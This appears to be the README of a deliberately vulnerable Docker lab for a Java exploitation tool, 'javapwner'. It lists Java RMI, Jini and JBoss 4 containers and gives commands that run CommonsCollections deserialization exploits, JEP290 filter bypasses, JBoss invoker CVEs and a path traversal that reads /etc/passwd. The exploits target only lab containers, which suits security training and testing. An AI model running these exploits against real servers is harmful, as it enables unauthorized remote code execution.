# JavaPwner — Lab Vulnérable

Environnement Docker couvrant 6 variantes JVM + Apache River + JBoss AS 4.x.
Chaque service expose CommonsCollections 3.1 dans le classpath.

---

## Démarrage

```bash
cd lab/
docker compose up -d --build
docker compose ps          # vérifier l'état
docker compose logs -f     # suivre les logs
```

> **JBoss** : prend 30–60 s au premier démarrage. Attendre le message `Started in` dans les logs.

---

## Services et ports

| Conteneur | Port(s) | Java | Scénario de désactivation JEP290 |
|-----------|---------|------|----------------------------------|
| `lab-rmi-java8` | 1099 / 1098 / 1097 | 8 LTS (482) | Bypass par réflexion (AllowAll) |
| `lab-rmi-java8-pre-jep290` | 1499 / 1498 / 1497 | **8u111** | Aucun filtre — champ `dgcFilter` absent |
| `lab-rmi-java8-jep290-configurable` | 1599 / 1598 / 1597 | **8u202** | Propriété système `dgcFilter=*` seule |
| `lab-rmi-java11` | 1199 / 1198 / 1197 | 11 LTS | Bypass Unsafe.putObjectVolatile |
| `lab-rmi-java17` | 1299 / 1298 / 1297 | 17 LTS | Bypass Unsafe.putObjectVolatile |
| `lab-rmi-java21` | 1399 / 1398 / 1397 | 21 LTS | Bypass Unsafe.putObjectVolatile |
| `lab-jini-reggie` | 4160 / 4162 / 8085 | 8u111 | Aucun filtre |
| `lab-jboss4` | 8080 / 4444 | 8 LTS | Agent lab + bootstrap classpath |

---

## Commandes d'exploitation

```bash
TARGET=127.0.0.1
GADGET=CommonsCollections6
```

### Java RMI — toutes variantes

```bash
# Java 8 LTS (bypass réflexion)
javapwner rmi scan    -t $TARGET -p 1099
javapwner rmi exploit -t $TARGET -p 1099 --gadget $GADGET --cmd "touch /tmp/pwned"
docker exec lab-rmi-java8 test -f /tmp/pwned && echo PASS

# Java 8u111 — pre-JEP290 (exploit direct, aucun bypass)
javapwner rmi scan    -t $TARGET -p 1499
javapwner rmi exploit -t $TARGET -p 1499 --gadget $GADGET --cmd "touch /tmp/pre-pwned"
docker exec lab-rmi-java8-pre-jep290 test -f /tmp/pre-pwned && echo PASS

# Java 8u202 — JEP290 ouvert par propriété système
javapwner rmi scan    -t $TARGET -p 1599
javapwner rmi exploit -t $TARGET -p 1599 --gadget $GADGET --cmd "touch /tmp/prop-pwned"
docker exec lab-rmi-java8-jep290-configurable test -f /tmp/prop-pwned && echo PASS

# Java 11
javapwner rmi exploit -t $TARGET -p 1199 --gadget $GADGET --cmd "touch /tmp/j11-pwned"
docker exec lab-rmi-java11 test -f /tmp/j11-pwned && echo PASS

# Java 17
javapwner rmi exploit -t $TARGET -p 1299 --gadget $GADGET --cmd "touch /tmp/j17-pwned"
docker exec lab-rmi-java17 test -f /tmp/j17-pwned && echo PASS

# Java 21
javapwner rmi exploit -t $TARGET -p 1399 --gadget $GADGET --cmd "touch /tmp/j21-pwned"
docker exec lab-rmi-java21 test -f /tmp/j21-pwned && echo PASS
```

### Jini / Apache River

```bash
# Scan (port Discovery = 4160 ; exploit via port JRMP = 4162)
javapwner jini scan    -t $TARGET -p 4160
javapwner jini exploit -t $TARGET -p 4162 --gadget $GADGET --cmd "touch /tmp/jini-pwned"
docker exec lab-jini-reggie test -f /tmp/jini-pwned && echo PASS

# Path traversal codebase (HTTP ClassServer :8085)
javapwner jini read-file -t $TARGET -p 4160 --path /etc/passwd
```

### JBoss AS 4.2.3.GA

```bash
# HTTP Invoker (CVE-2015-7501, CVE-2017-7504)
javapwner jboss scan    -t $TARGET -p 8080
javapwner jboss exploit -t $TARGET -p 8080 --gadget $GADGET --cmd "touch /tmp/jboss-pwned"
docker exec lab-jboss4 test -f /tmp/jboss-pwned && echo PASS

# Canal JNP/JRMP (port 4444 → container:1099)
javapwner jboss jnp-scan    -t $TARGET
javapwner jboss jnp-exploit -t $TARGET --gadget $GADGET --cmd "touch /tmp/jnp-pwned"
docker exec lab-jboss4 test -f /tmp/jnp-pwned && echo PASS
```

---

## Détection de version JVM

`javapwner rmi scan` affiche désormais une estimation de la sous-version JVM et le niveau d'exploitabilité :

```
──── DGC / JEP 290 ────
[!] DGC JEP 290 : filtered — RCE requires bypass
[*]   JVM estimate : JDK 8u121-8u231 (JEP290 property-configurable era)  (confidence: high)
[*]   Bypass hint  : dgcFilter=*;maxdepth=100 property may be sufficient
[!]   Exploitability : MEDIUM — DGC filtered, bypass may be viable
```

---

## Nettoyage

```bash
docker compose down                   # arrêter les services
docker compose down --rmi all -v      # supprimer images et volumes
```
